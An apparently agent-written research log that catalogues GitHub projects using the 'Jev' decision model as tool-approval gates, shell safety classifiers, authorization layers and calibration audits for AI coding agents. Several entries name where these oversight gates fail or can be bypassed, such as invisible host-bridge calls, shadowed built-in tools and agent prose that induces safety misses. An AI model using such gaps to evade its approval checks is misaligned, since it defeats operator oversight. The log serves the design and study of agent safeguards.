`methods-catalog.md`; `toolbox-mapping.md`;
`agent-self-assessment.md`; `optimizer-integration.md` (soft
labels ≠ teacher-of-record). No wrapper.

## 62. Permission vs probability (greenlight), judgment ≠ permission (skill-broker outline), eval integrity / instrument-not-score (dinostomp) (2026-09-18 ~22:38 Boise)

America/Boise ~22:38 = 2026-09-19T04:38Z. Docs-only fold into
open PR #2 (`cursor/augustus-store-envelope-00b4`). Not a
competing PR. Archer 27B drop still **WATCH**. Identity lock vs
`typesafe-ai` / `tenbin` / `decision-first` holds. No wrapper,
no pip/hook/venv/.env/uv/npm/bun/`omp plugin`/YAML how-to, no
copied key-file paths. No invented metrics. Do not re-fold
§50–§61. TypeSafe Jev is the documented exemplar, not the
monopoly. Augustus stays how-to-apply / mental model /
architecture / toolbelt + jevals/Harbor practice — **not** a
thin Jev skill. Backend-agnostic
categorization/scoring/decision-only class.

Watch archive path `/workspace/jev-archive/2026-09-18/223856`
is **not present** on this VM (searched `/workspace`,
`/home/ubuntu`, `/opt`, `/tmp`). Receipts this pass are live
GitHub READMEs + `gh api` metadata (2026-09-19 ~04:45Z).

Three HIGH **mental-model / measurement** signals: measured
OMP tool-approval *suppression* where the operator owns the
bar and the plugin never self-tunes it (permission vs
probability); a Hermes pre-agent skill-intervention *outline*
that keeps authority in code and never lets Jev grant access
(judgment ≠ permission — **not a production recipe**); an
eval verification layer that checks the instrument, not just
the score, with first-class TypeSafe Jev question testing
(`dinostomp jev` as if-statement hygiene). Optional MED
toolbelt only. Curated census recorded; X MCP still flapping.

### HIGH

1. **[`SemetricLabs/omp-greenlight`](https://github.com/SemetricLabs/omp-greenlight)**
   (Python; MIT; created 2026-09-19T04:06:43Z; 0★ this pass;
   GitHub `size` 0 this pass — README is live). OMP plugin
   that grades every **gated** tool call with Jev and
   **suppresses the approval prompt** when Jev says allow.
   Everything else still prompts, with Jev's verdict attached.
   Not a sandbox. Not a security boundary. Installing it
   hands auto-approval authority for shell commands to a
   third-party model. The host's `bash.patterns: deny` remains
   the deterministic floor and still fires **ahead** of
   Greenlight (covered by a test). Distinct from
   [`TannerMidd/specpi-jev-guard`](https://github.com/TannerMidd/specpi-jev-guard)
   (single danger score; static fast path miss),
   [`fdemir/toolgate`](https://github.com/fdemir/toolgate)
   (pre-exec allow/block/review; Jev is not authorization),
   [`somoore/interlock`](https://github.com/somoore/interlock)
   (capability kernel), and
   [`luw2007/omp-jev-extensions`](https://github.com/luw2007/omp-jev-extensions)
   (fail-open *route* vs prompt suppression). Composes with
   [`mossburgh/waymode`](https://github.com/mossburgh/waymode)
   (host-owned handlers/permissions) and omp-jev-extensions.
   Do not copy `omp plugin install` / YAML how-to.

   **Measured traffic *theirs*:** **1,013 tool calls / 10
   sessions / 8.95 session-hours.** Preset table (prompts
   removed / unsafe auto-approvals of 94 labelled
   *review-or-deny* rows on a **140-row corpus**):

   | Preset | prompts removed | unsafe auto-approvals (of 94) |
   |---|---|---|
   | conservative | 29.9% | 0 |
   | **default** | **40.9%** | **0** |
   | permissive | 56.9% | 1 |
   | aggressive | 72.9% | 7 |

   Latency ~310 ms p50 / ~450 ms p95 **per gated call**;
   ~1,258 input tokens. `yolo` = complete no-op. Cost
   *theirs*: ~**$0.05** for the whole 1,013-call measurement
   vs frontier LLM gates 54–252× (their table). **Operator
   owns thresholds** — the plugin never self-tunes the safety
   bar, because a self-adjusting bar cannot be audited by the
   person accepting the risk. Live traffic has **no
   ground-truth labels**; 0/94 is the labelled corpus, and it
   is small. Cite **40.9%**, not a rounded 41%, and cite 0/94
   as corpus, not live traffic.

   **Deliberately not shipped:** (1) the agent's own prose is
   never sent — adding it took corpus safety misses from
   **0 → 3**; (2) never shadows a built-in tool (would bypass
   OMP deny rules). Static fast path measured at 0/1,013
   matches and **deleted**. Headless: non-allow blocks only
   the `deny` class. Host-bridge tool calls (browser,
   computer-use) are invisible to the gate.

2. **[`adamjralph/skill-broker`](https://github.com/adamjralph/skill-broker)**
   (language null; license null; created
   2026-09-19T04:35:59Z; 0★; GitHub `size` 0). **Project-
   definition outline only.** `PROJECT-OUTLINE.md` is
   authoritative; next step is a to-spec workflow, **not a
   build**. Do **not** treat as a production recipe. Do not
   copy an install.

   Hermes pre-agent skill intervention: **deterministic code
   owns authority, catalog, limits, grants**; Jev only scores
   relevance/confidence over a small authorised candidate
   set and **never grants access**. Candidates ≠ grants.
   Unknown/unauthorised Jev IDs are rejected. Jev unavailable
   or invalid → deterministic fallback or **foundation-only;
   never broaden access.** Replayable route evidence must
   distinguish retrieval, judgment, and code-enforced grant.
   Foundation skills stay native; specialised skills are
   brokered after the path is proved. Shadow mode before
   injection. Unauthorised-grant rate must remain zero.

   Distinct from
   [`de-niji/jev-hermes`](https://github.com/de-niji/jev-hermes)
   (route ≠ memory; cheap intent skips tours) and from
   applied-mappings §5 *shipped* routers (GodsBoy, routeKit,
   jev-adaptive-thinking, omp-jev-extensions). Same mental
   model as interlock/toolgate **authority split**, applied
   to skill packs rather than tool execution. Status:
   **Hypothesis / outline.** Delivery stages 1–9; first
   production pilot is not claimed.

3. **[`collapseindex/dinostomp`](https://github.com/collapseindex/dinostomp)**
   (Python; README **Apache-2.0**, GitHub license
   **NOASSERTION**; created 2026-08-09T07:59:32Z; **5★**;
   size 11288 this pass). Eval verification layer: **"checks
   the instrument, not just the score"** — data, scorer,
   runs, numbers, claims, and itself. 100 checks;
   FINDINGS.md **189** entries (F 52 / D 99 / N 38); **99 of
   189 against itself**. "The tool proposes. The human
   disposes." Anti-soundness-theater cousin of
   [`24601/rh-guard`](https://github.com/24601/rh-guard)
   (eval-integrity sidecar),
   [`egma-ai/jev-reviewer`](https://github.com/egma-ai/jev-reviewer)
   (attention ≠ correctness), and
   [`JoelLewis/game-coach`](https://github.com/JoelLewis/game-coach)
   (engine owns truth / Jev owns judgment). Harbor/jevals:
   question hygiene **beside** jevals, not a Harbor taskset.
   Do not copy pip how-to.

   First-class TypeSafe Jev testing: `dinostomp jev` tests a
   Jev question **like an if-statement** — accuracy, p(yes)
   threshold, ECE, blank-input lean, rewording flips. Demo
   *theirs* (`urgency.jev.yaml`, 24 examples, jev-1.13.0):
   accuracy 100% (24/24; 95% interval 86–100%), ECE **0.062**
   (bar 0.10), blank input answers 'no' at 0.81, rewording
   0 of 60 flipped. That card is **their 24-example demo**,
   not a class ranking. Anti-pattern: treating a Jev score
   as eval truth without auditing data/scorer/claims.

### MED (toolbelt; brief)

- **[`nrdz-labs/fast-jev-opencode`](https://github.com/nrdz-labs/fast-jev-opencode)**
  (TypeScript; MIT; created 2026-09-19T03:51:47Z; 1★).
  OpenCode V2 context-hook port of fast-jev-compaction.
  Fail-open; cache-backed. Distinct from
  `zaycruz/fast-jev-compaction-pi`.
- **[`yikangy873-gif/jev-desktop`](https://github.com/yikangy873-gif/jev-desktop)**
  (JavaScript; MIT; created 2026-09-19T04:22:48Z; 0★).
  TypeSafe Jev action selection inside Codex Computer Use.
  Cousin of observe→score→act, not a new species.
- **[`MrDiamondBallz/jev-agent-integration`](https://github.com/MrDiamondBallz/jev-agent-integration)**
  (Python; MIT; created 2026-09-19T03:56:05Z; 0★).
  Provider-neutral Hermes skill/plugin. Portable Agent Skill.
  Distinct from skill-broker (this one is a plugin; skill-
  broker is an outline for pre-agent *authority*).
- **[`bohutang/sift`](https://github.com/bohutang/sift)**
  (JavaScript; MIT; created 2026-09-19T03:46:56Z; 0★).
  Chrome extension: X feed Substance/Humor/Chit-chat/Promo/
  Junk/AI-written labels via Jev; hide the ones you don't
  want. Showcase, not a new mapping.
- **[`CorieW/JevExplore`](https://github.com/CorieW/JevExplore)**
  (TypeScript; license null; created 2026-09-19T04:22:25Z;
  0★). Bounded web action-space discovery with Playwright +
  Jev. Distinct from closed-vote JevOnly / waymode.

### Curated status (watch numbers; not re-derived here)

- Awesomejev **flat 488/21644** (not independently re-counted).
- Live SemIf **1641★** (+13). jevlike **905★** (+4).
- Tracker likes **41** (+1); Hub `lastModified` unchanged
  this pass. Laya **yes**. Blackwood **ABSENT**.
- X MCP still flapping — `pages_archived` **0**.

These are census, not placements. SemIf / jevlike / Laya /
Blackwood already have cards; no reopen.

### Omni / Jev-omni / Archer

Still **WATCH**. No Hub weights. A measured OMP prompt-
suppression plugin, an outline that says Jev never grants
access, and an eval-instrument auditor are **not** that drop.

### Cross-links

Cards: `applied-mappings.md` §5 (greenlight prompt
suppression; skill-broker outline), §7 (permission vs
probability; not a sandbox); `mappings.md` §7 (operator owns
the criterion; plugin never self-tunes the bar), §8 (host
deny stays above Greenlight; Jev never grants skill access);
`mixed-architecture.md` (fail table + gallery);
`validation.md` (greenlight 1013/10 / 40.9% / 0 of 94;
dinostomp jev-as-if ECE 0.062 *theirs*); `faq.md` (Jev is not
authorization; judgment ≠ permission; instrument not score);
`mental-models.md`; `methods-catalog.md`;
`toolbox-mapping.md`; `agent-self-assessment.md`;
`formal-methods.md` (dinostomp anti-soundness-theater). No
wrapper.

## 63. Constrained optimizer + S1 features (slo-router), privilege ≠ verdict (construct-auto-classifier), attention/VOI never-block (jev-lens) (2026-09-18 ~23:40 Boise)

America/Boise ~23:40 = 2026-09-19T05:40Z. Docs-only fold into
open PR #2 (`cursor/augustus-store-envelope-00b4`). Not a
competing PR. Archer 27B drop still **WATCH**. Identity lock vs
`typesafe-ai` / `tenbin` / `decision-first` holds. No wrapper,
no uvicorn / OpenRouter / bun / agy / marketplace / key-file
how-to. No invented metrics. Do not re-fold §50–§62. TypeSafe
Jev is the documented exemplar, not the monopoly. Augustus
stays how-to-apply / mental model / architecture / toolbelt +
jevals/Harbor practice — **not** a thin Jev skill.
Backend-agnostic categorization/scoring/decision-only class.

Watch archive path `/workspace/jev-archive/2026-09-18/234027`
is **not present** on this VM (searched `/workspace`,
`/home/ubuntu`, `/opt`, `/tmp`). Receipts this pass are live
GitHub READMEs + `gh api` metadata + Hugging Face card
(2026-09-19 ~05:50Z). Causes below are **hunches**, not
promoted Contract.

Three HIGH **mental-model / measurement** signals: System One
on the **feature side of a constrained optimizer** (never the
sole hard gate on the hot path), with a Harbor-style negative
on sync Jev latency; an **effect-based** shell safety gate
where privilege is not a verdict and independent risk Nouls
compose with Choice (fail-closed; 0 dangerous allowed for
Jev); System One as an **attention filter / VOI for human
review** that never blocks the agent and never says green
unless sure. Optional MED toolbelt only. Curated census
recorded; X MCP still flapping.

### HIGH

1. **[`zeeshan8281/slo-router`](https://github.com/zeeshan8281/slo-router)**
   (Python; license **null**; created 2026-09-19T05:32:45Z; 0★
   this pass; GitHub `size` 0 this pass — files are live:
   `slo_router/`, `results/`, `tests/`). OpenAI-compatible
   proxy. Jev 1.13 via OpenRouter alpha
   `POST /api/alpha/decisions` pinned `typesafe/jev-1.13`
   supplies bounded semantic features: **task / exactness /
   external-evidence**. A constrained controller picks the
   cheapest backend meeting health / context / tools / quality
   floor / predicted SLO-success probability. Exactness
   **raises the quality floor; never overrides context or
   capability**. Fail-open: timeout / 429 / malformed /
   overload → deterministic local features. Header
   `X-SLO-Feature-Source`: `jev` / `jev_cache` /
   `lexical_fallback`. Policies: `fixed_cheapest`,
   `fixed_strongest`, `quality_only`, `slo_no_jev`, `slo`.
   Distinct from
   [`rajdhakad9826/routeKit`](https://github.com/rajdhakad9826/routeKit)
   (Jev estimates requirements; code maps — **Hypothesis**
   until measured) and
   [`affirmitv/bitrate-advisor`](https://github.com/affirmitv/bitrate-advisor)
   (soft affinity inside a hard cap). Same **assignment-hybrid
   shape**: judgment is a cost/quality *feature*; the solver
   owns floors. Do not copy uvicorn / OpenRouter how-to. Do
   not present the eight-row `demo.jsonl` as a model
   benchmark.

   **Measured live Jev analysis *theirs* (19 Sep 2026; sim
   backends + real Jev; integration, not a real-model quality
   claim):**

   | Policy | Features | Accuracy | Routes | p95 E2E |
   |---|---|---|---|---|
   | SLO, no Jev | local | 100% | fast 4 / strong 4 | **77.93 ms** |
   | SLO + Jev | live Jev | 100% | fast 4 / strong 4 | **490.38 ms** |

   Same routes, same accuracy; p95 **~6.3×**. Jev feature
   latency p50 **453.58 ms** / p95 **1257.50 ms**. 16/16 Jev
   calls succeeded; no lexical fallbacks. Jev disagreed on
   **3/8** task labels (`code_debugging` vs `reasoning`,
   arithmetic → `other`) and **did not change routes** —
   exactness still sent arithmetic to the strong backend.
   Author conclusion: keep Jev **out of the synchronous path
   for this workload** unless a larger real-model matrix
   shows quality gains that justify hundreds of ms tail.
   Includes a counterfactual matrix + arrival-rate replay
   contract.

   **Hunch / Augustus takeaway:** put System One on the
   **feature side of a constrained optimizer**, never as the
   sole hard gate on the hot path. Harbor-style measurement
   of decision-model **latency cost** is mandatory before you
   claim “Jev routing.” Exactness raising a quality floor
   must not override capability/context checks (signal-
   detection + VOI). Fail-open to local features is the
   correct polarity when the act is *picking a backend*, not
   authorizing an irreversible side effect.

2. **[`godspede/construct-auto-classifier`](https://github.com/godspede/construct-auto-classifier)**
   (TypeScript; Apache-2.0; created 2026-09-18T22:27:03Z; 0★;
   size 114). Effect-based shell safety gate for OpenCode /
   Antigravity. Fast-deny / fast-allow **<1 ms**, then Jev
   (default) or a chat LLM. Jev: one Choice allow/deny +
   **nine independent risk Nouls** (`data_loss`, `secrets`,
   `remote_code`, `security_control`, `offensive`,
   `shared_state`, `git_plumbing`, `system_state`,
   `connections`). Allow only if Choice allow at
   `jev.minConfidence` (0.6) **and** every risk below
   `jev.riskThreshold` (0.7). Missing / low-conf / high-risk
   / failed call = **deny (fail-closed)**. Operator-owned
   dials. **Privilege is not a verdict** (`sudo status` can
   be a safe read). Distinct from toolgate / greenlight /
   jevgate / pi-jev-approver / specpi-jev-guard / interlock.
   Pair with
   [`collapseindex/dinostomp`](https://github.com/collapseindex/dinostomp)
   (audit the instrument before trusting scores) and
   [`SemetricLabs/omp-greenlight`](https://github.com/SemetricLabs/omp-greenlight)
   (operator-owned dial). Do not copy bun / agy hook /
   opencode plugin how-to.

   **Certification *theirs* (18–19 Sep 2026):** main 113
   (Opus-written, used for tuning) + blind 82 (Qwen3.5 397B,
   frozen); 5 passes; **975 decisions/model**. Bar = **zero
   dangerous commands allowed**. Jev: **0** dangerous
   allowed, 100% caught, 99.5% decisions correct,
   **$0.047/1k**. Every chat model leaked dangerous cmds
   (16–104). Jev is the only certified model. Cite 0/975 as
   *their* certification through the whole gate, not a
   Harbor taskset and not a class ranking.

   **Hunch:** privilege ≠ verdict. Effect semantics +
   independent risk questions compose with Choice. Formal-
   methods angle: **contracts on effects, not surface
   tokens**. Fast structural prove ∩ remainder judge
   (`mappings.md` §18) with fail-closed polarity on the
   *execution* act (contrast jevgate cannot-block).

3. **[`rashedInt32/jev-lens`](https://github.com/rashedInt32/jev-lens)**
   (JavaScript; MIT; created 2026-09-19T04:46:01Z; 0★; size
   49 this pass) + companion
   **[`rashedInt32/jev-lens.nvim`](https://github.com/rashedInt32/jev-lens.nvim)**
   (Lua; MIT; created 2026-09-19T04:47:11Z; 0★; size 20).
   Claude Code stop-hook: calibrated “do I need to look /
   which files / strip debris?” via Jev Nouls. SessionStart
   snapshot, UserPromptSubmit, PostToolUse, Stop (background
   judge; returns at once). Per-file: need a look / kind /
   which prompt; debris questions. **Never blocks** Claude,
   **never edits** files, **never says green unless sure**
   (`JEV_LENS_GREEN` 0.9). Shadow mode recommended first
   week. Distinct from
   [`rashedInt32/jev-gates`](https://github.com/rashedInt32/jev-gates)
   (stops writes) and from
   [`egma-ai/jev-reviewer`](https://github.com/egma-ai/jev-reviewer)
   (PR attention ≠ correctness — same *attention* hole,
   different surface). nvim popup only: no API, no key;
   optional strip is operator-confirmed and refuses dirty
   buffers. Do not copy marketplace / key-file how-to.

   **Hunch:** System One as **attention filter / VOI for
   human review**, not a permission gate. Complements
   skill-broker (Jev never grants access) and omp-greenlight
   (operator owns the bar). Decision-theory: minimize
   expected human cost under **false-green** risk. Fail
   polarity: the agent is never blocked (fail-open for the
   *agent's* continue); “skip it / green” is fail-closed for
   the *human's* skip.

### MED (toolbelt; brief)

- **[`sysone-help/sysone`](https://github.com/sysone-help/sysone)**
  (TypeScript; MIT; created 2026-09-19T05:37:15Z; 0★; GitHub
  `size` 0 this pass — README is live). Provider-agnostic TS
  library: `predicate` / `classifier` / `rubric` as **pure
  data**; `check` / `evaluate` / `filter` / `partition` /
  `rank`; first adapter = Jev via Vercel AI Gateway; explicit
  cancellable, **never auto-retry**. Evaluation-model-first
  SDK shape. Independent of TypeSafe/Vercel. **Name
  collision** with
  [`hraness/sysone`](https://github.com/hraness/sysone)
  (loopback gateway, already folded §60) — do not merge.
- **[`ctaxnagomi/INSTRUCT_JEV`](https://huggingface.co/datasets/ctaxnagomi/INSTRUCT_JEV)**
  (HF dataset; MIT; `lastModified` 2026-09-19T05:06:29Z;
  likes 0). Docs-derived Choice/Noul/Score instruct corpus.
  **119** rows (47 choice / 51 noul / 21 score); 24 with a
  typed question block / 7 with typed answers. Open-replica /
  jevals seed. Credit: TypeSafe docs, compiled by DeckerGUI.
- **[`ckaik/swift-jev`](https://github.com/ckaik/swift-jev)**
  (language **null**; MIT; created 2026-09-19T05:21:00Z; 0★;
  size 0). Files this pass: **LICENSE only**. Thin Swift
  host-adapter *intent*, not a CLI product. Do not fold as
  a working Swift SDK.

### Curated status (watch numbers; not re-derived here)

- Awesomejev **flat 488/21644** (not independently re-counted).
- Live SemIf **1652★** (+11).
- Tracker likes **42** (+1); Hub `lastModified` unchanged
  this pass. Laya **yes**. Blackwood **ABSENT**.
- X MCP still flapping — no new discourse archived.

These are census, not placements. SemIf / Laya / Blackwood
already have cards; no reopen. jevlike not re-counted this
pass.

### Omni / Jev-omni / Archer

Still **WATCH**. No Hub weights. A measured constrained
router, an effect-based shell gate, and an attention-filter
stop-hook are **not** that drop.

### Cross-links

Cards: `applied-mappings.md` §5 (slo-router constrained
controller; Jev features not the sole gate), §7 (construct
effect-gate; privilege ≠ verdict); `mappings.md` §6 (slo-
router latency-cost VOI; jev-lens human-review VOI), §7
(exactness raises floor, does not override capability;
privilege ≠ verdict), §8 (effect contracts; attention ≠
permission), §15 (slo-router Empirical as assignment-hybrid
*shape*), §18 (construct fast-allow/deny prove ∩ remainder);
`mixed-architecture.md` (fail table + gallery);
`validation.md` (slo-router 77.93→490.38 same routes;
construct 0 dangerous / 975; INSTRUCT_JEV seed);
`faq.md` (Jev not sole hard gate; privilege ≠ verdict;
attention filter not permission); `mental-models.md`;
`methods-catalog.md`; `toolbox-mapping.md`;
`agent-self-assessment.md` (construct fail-closed pre-gate;
jev-lens Stop never blocks); `formal-methods.md` (contracts
on effects, not tokens). Hunches labeled. No wrapper.

## 64. Measurement owns endorsement (jev-packs), Jev supplies evidence / code owns authority (actiongate), ranking ≠ calibration (does-jev-confidence) (2026-09-19 ~00:39 Boise)

America/Boise ~00:39 = 2026-09-19T06:39Z. Docs-only fold into
open PR #2 (`cursor/augustus-store-envelope-00b4`). Not a
competing PR. Archer 27B drop still **WATCH**. Identity lock vs
`typesafe-ai` / `tenbin` / `decision-first` holds. No wrapper,
no pnpm / uvx / OpenRouter / marketplace how-to. No invented
metrics. Do not re-fold §50–§63 except one-line cross-links.
TypeSafe Jev is the documented exemplar, not the monopoly.
Augustus stays how-to-apply / mental model / architecture /
toolbelt + jevals/Harbor practice — **not** a thin Jev skill.
Backend-agnostic categorization/scoring/decision-only class.

Watch archive path `/workspace/jev-archive/2026-09-19/0039`
is **not present** on this VM. Receipts this pass are live
GitHub READMEs + `gh api` metadata (2026-09-19 ~06:45Z).
Causes below are **hunches** unless labeled Empirical.

Three HIGH **mental-model / measurement** signals: question
packs as **evidence-gated artifacts** (measurement owns
endorsement); runtime authorization whose slogan is **Jev
supplies evidence, code owns authority** (a positive model
score never overrides a deterministic security failure);
a human-annotated calibration audit showing **ranking ≠
calibration** (AUC ~0.91 while stated p is a shifted unit).
Optional MED open-replica pointers only. Curated census
recorded; X MCP still flapping.

### HIGH

1. **[`dtduc-git/jev-packs`](https://github.com/dtduc-git/jev-packs)**
   (Python; CC0-1.0 for hand-written packs; created
   2026-09-19T06:35:36Z; 0★; GitHub `size` 0 this pass —
   README + pack tables are live). Evidence-gated registry
   of Jev-compatible question packs: `pack.yaml` +
   `cases.jsonl` + (once measured) `evidence.md`. A pack is
   only `verified` in `index.json` after a runner records
   accuracy / ECE / cost / latency on a **pinned**
   `jev-1.13.0`. Abstention is **mandatory**: every Choice
   and Score must offer an `unknown` label (spec + CI).
   Backend-neutral YAML/JSONL (Jev API / Gateway / local
   replicas). Dataset-derived packs keep upstream licenses
   (SMS Spam / Banking77 CC BY 4.0; BoolQ CC BY-SA 3.0);
   raw source data is never committed.

   Named suite: **jevassert** (runner) → jev-packs (data +
   spec) → **jev-table** (app). This pass, GitHub has
   **no** `dtduc-git/jevassert` or `dtduc-git/jev-table`
   (404). The README says the runner is **not yet released**;
   packs are structurally validated by CI. Do not treat
   jevassert as a shipped product. Do not copy `uvx` how-to.

   **Nine packs already `verified` *theirs* (single-run on
   golden cases, `jev-1.13.0`):**

   | Pack | Items | Acc | ECE | $/case |
   |---|---:|---:|---:|---:|
   | citation-support | 800 | 0.919 | 0.022 | $0.000017 |
   | rag-answerability | 840 | 0.908 | 0.021 | $0.000025 |
   | moderation | 1,350 | 0.906 | 0.027 | $0.000031 |
   | rag-passage-relevance | 800 | 0.899 | 0.035 | $0.000018 |
   | entity-merge | 840 | 0.857 | 0.017 | $0.000018 |
   | support-triage | 1,350 | 0.887 | 0.059 | $0.000028 |
   | sms-spam | 150 | 0.967 | 0.053 | $0.000014 |
   | boolq-yes-no | 150 | 0.887 | 0.063 | $0.000018 |
   | banking-intent | 150 | 0.840 | 0.090 | $0.000029 |

   Single-run, not a Harbor taskset, not a class ranking.
   Cousin of jevals-data (recompute-from-logs feedstock),
   dinostomp (instrument not score), and INSTRUCT_JEV
   (docs-derived instruct seed — no evidence gate).

   **Hunch / Augustus takeaway:** Harbor/jevals pattern for
   the decision-model class — treat question packs as
   **measured artifacts**, never cookbook-once-and-forget.
   Packs that lack evidence stay `provisional`. Measurement
   owns endorsement. Pin the model version.

2. **[`omkarghugarkar007/actiongate-jev`](https://github.com/omkarghugarkar007/actiongate-jev)**
   (TypeScript; Apache-2.0; created 2026-09-19T06:20:33Z;
   0★; GitHub `size` 0 this pass — README is live). Runtime
   authorization for agent tool calls: deterministic
   policy / RBAC / schemas / limits own ALLOW | REVIEW |
   BLOCK; TypeSafe Jev via OpenRouter supplies **semantic
   evidence only**. Explicit slogan: **"Jev supplies
   evidence. Code owns authority."** A positive model score
   **never overrides** a deterministic security failure.
   Six narrow questions in one request (alignment, target
   match, policy conflict, sensitive-data exposure, scope
   expansion, missing intent) — never one vague "is this
   safe?" and never generated prose as the reason.
   Financial / destructive / credential actions **fail
   closed** when Jev is unavailable. Server owns risk class
   (agents cannot self-declare safer). Early public MVP;
   mock/sandbox tools; ActionGate decides, the app owns
   execution and credentials. The 500-case default eval is
   a **label-baseline integrity run, not a claim of model
   accuracy**. Distinct from toolgate (pre-exec of a
   proposed call), interlock (capability kernel; secrets
   never in the agent), construct-auto-classifier (shell
   effect-gate), omp-greenlight (prompt suppression).
   One-line compose with construct: privilege ≠ verdict;
   here the hard gate is deterministic policy, Jev is the
   sensor. Do not copy pnpm / OpenRouter how-to.

   **Hunch / Augustus takeaway:** canonical anti-pattern
   counterexample to soundness theater / hard-gating a
   soft judgment as safety. Decision models as sensors in
   an effect-based control loop, not sole hard gates.
   Formal/semi-formal: deterministic policy is the hard
   gate; Jev is soft evidence.

3. **[`Adilmp/does-jev-confidence-mean-anything`](https://github.com/Adilmp/does-jev-confidence-mean-anything)**
   (Python; license **null**; created 2026-09-19T04:51:58Z;
   0★; size 3671) + companion
   **[`Adilmp/jevcal`](https://github.com/Adilmp/jevcal)**
   (Python; MIT; created 2026-09-19T05:44:21Z; **1★**; size
   0 this pass — README is live). Calibration audit of
   `jev-1.13.0` against **human** annotations
   (`civil_comments`), not another model's opinion.
   **8,000 judgments · 4 wordings · 2 base rates · $0.05.**

   **Finding *theirs*:** ranking is strong (AUC **~0.91**;
   rank correlation of stated confidence vs flag rate
   **0.96**). Probabilities are **systematically shifted
   toward "yes."** On realistic comment traffic with the
   best wording they found: when Jev said **~75%**, humans
   flagged **~10%**. Every confidence band sat below the
   diagonal. Two-parameter recalibration (Platt / isotonic;
   fit on one half, score on the other) removes **~96% of
   ECE** without changing ranking (AUC 0.918 → 0.918).
   Headline row: `natural` / tightened ECE **0.156 → 0.006**,
   AUC 0.912. Wording shifts the *scale*, not the signal
   (ECE 0.21–0.52 across four wordings; AUC barely moved).
   Accuracy is a trap: `insult` at 0.5 scored **61.0%**
   where always-"no" scores **67.8%**, while AUC was 0.83.

   TypeSafe's "Calibrated: higher confidence means higher
   accuracy" is **true as rank-correlation** here and
   **false as probability units**. `if p > 0.9` does not
   do what it looks like. One dataset, one model version;
   `threat` has **one** positive in 400 — do not cite those
   numbers. Companion `jevcal`: ~**100** labelled rows
   (94% of calibration error removed at 100; warns under
   50 or 10 positives). Demo *theirs* on 1,600 real Jev
   rows: stated 0.9 delivers **33%**; Platt Brier
   0.0837 → 0.0248, AUC unchanged 0.9264. ECE is gameable
   (constant base-rate has ECE 0.0000 / AUC 0.5) — they
   decide on **Brier**. Class-agnostic: any model that
   emits a probability you threshold. Cousin of jev-arena
   (analytic-world ECE), jev-orderby-bench (calibration ≠
   sortable), dinostomp (instrument). Do not copy curl /
   `.env` how-to.

   **Hunch / Augustus takeaway:** ranking ≠ calibration.
   Never hard-threshold raw decision-model probabilities
   as if they were frequencies without **domain**
   recalibration. "Calibrated" in vendor docs often means
   rank-correlation, not probability units. Signal
   detection / threshold design / Harbor eval practice.

### MED (open-replica pointers; brief)

- **[`gqgs/laya-onnx`](https://github.com/gqgs/laya-onnx)**
  (Python; license **null**; created 2026-09-19T06:24:24Z;
  0★; GitHub `size` 0). **Complete** Laya → browser ONNX
  int8 (decision heads, option scorer, qtype embeddings,
  act/escalate; 496.8 MiB). Conversion smoke tests, not a
  task-accuracy or calibration benchmark. Distinct from
  [`Mattepiu/laya-onnx`](https://huggingface.co/Mattepiu/laya-onnx)
  (earlier HF port). Primary omni archive stays Jev-omni.
  Archer still Watch. Do not copy npm / LFS how-to.
- **[`kunchenguid/local-jev`](https://github.com/kunchenguid/local-jev)**
  (language **null**; MIT; created 2026-09-19T06:14:18Z;
  0★; size 0). Local `/v1/systemone`-shaped ModernBERT
  zero-shot ONNX. README: **"API-compatible local
  approximation — not behavioral equivalence with Jev."**
  Distinct from `us/jev-local` (stub until hf) and jeff
  (GLiFormer). Thin this pass (`IMPLEMENTATION-PLAN.md`).

Do **not** re-fold sysone-help/sysone (already §63 MED).

### Curated status (watch numbers; not re-derived here)

- Awesomejev **flat 488/21644**.
- Live SemIf **1660★** (+8). jevlike **910★** (+5). TypeAR **9**.
- Tracker likes **42**; Hub `lastModified` unchanged.
  Laya **yes**. Blackwood **ABSENT**.
- Archer Hume open multimodal still **NOT landed**
  (`archerhume/4rcherhume` absent; community Qwen3.8-27B
  quants only).
- X MCP still flapping — no discourse archived this hour.

These are census, not placements. No reopen of SemIf /
Laya / Blackwood / TypeAR cards.

### Omni / Jev-omni / Archer

Still **WATCH**. A question-pack registry, a runtime
authorization slogan, and a calibration audit are **not**
that drop. `gqgs/laya-onnx` is an open-replica browser
port, not Archer.

### Cross-links

Cards: `applied-mappings.md` §7 (actiongate: Jev evidence,
code authority); `mappings.md` §7 (ranking ≠ calibration;
never threshold raw p as frequency), §8 (deterministic
policy is the hard gate); `validation.md` (jev-packs nine
verified packs; 8,000-judgment audit; jevcal ~100-row
fit); `faq.md` (measurement owns endorsement; positive
score never authorizes; "calibrated" ≠ frequency);
`mental-models.md`; `methods-catalog.md`;
`toolbox-mapping.md`; `agent-self-assessment.md`;
`formal-methods.md`; `judgment-class.md` (gqgs/laya-onnx;
local-jev not equivalence). Hunches labeled. No wrapper.

## 65. Same-hour remainder: hot-click CU (ego-jev), Jev judges relevance / code decides structure (jev-compactor), local-rules-then-remainder + anti-self-train (x-reply-filter) (2026-09-19 ~00:39 Boise)

America/Boise ~00:39 = 2026-09-19T06:39Z. Same watch hour as
§64. Docs-only fold into open PR #2
(`cursor/augustus-store-envelope-00b4`). Not a competing PR.
Archer 27B drop still **WATCH**. Identity lock vs
`typesafe-ai` / `tenbin` / `decision-first` holds. No
wrapper, no install.sh / pnpm / wrangler / OpenRouter /
key-file how-to. No invented metrics. Do **not** re-fold
§50–§64 HIGH except one-line cross-links. Skip re-fold of
actiongate-jev / jev-packs (already §64) and
sysone-help/sysone (already §63 MED). TypeSafe Jev is the
documented exemplar, not the monopoly. Augustus stays
how-to-apply / mental model / architecture / toolbelt +
jevals/Harbor practice.

Watch archive path `/workspace/jev-archive/2026-09-19/0039`
is **not present** on this VM. Receipts this pass are live
GitHub READMEs + `gh api` metadata (2026-09-19 ~06:50Z).
Causes below are **hunches** unless labeled Empirical.

Three HIGH **architecture** signals that were queued in
the same hour: System One on the **hot click path**
(indexed element table → operation+target in one request;
code owns observe/execute/verify; text model only when
typing is needed); **framework-agnostic verbatim
compaction + same-pass safety** (previously an empty skip
in §61 — now landed); **local rules first, then batched
remainder Nouls**, with a feedback loop that **does not
auto-train on the model's own hides**. Census already
recorded in §64 (SemIf 1660 / jevlike 910). X MCP still
flapping.

### HIGH

1. **[`jiangkoumo/ego-jev`](https://github.com/jiangkoumo/ego-jev)**
   (JavaScript; MIT; created 2026-09-19T06:33:03Z; 0★;
   GitHub `size` 0 this pass — `ego-jev.mjs` 34,752 B and
   README are live). Drive
   [ego-lite](https://github.com/citrolabs/ego-lite)
   with Jev: viewport **indexed element table** (ref /
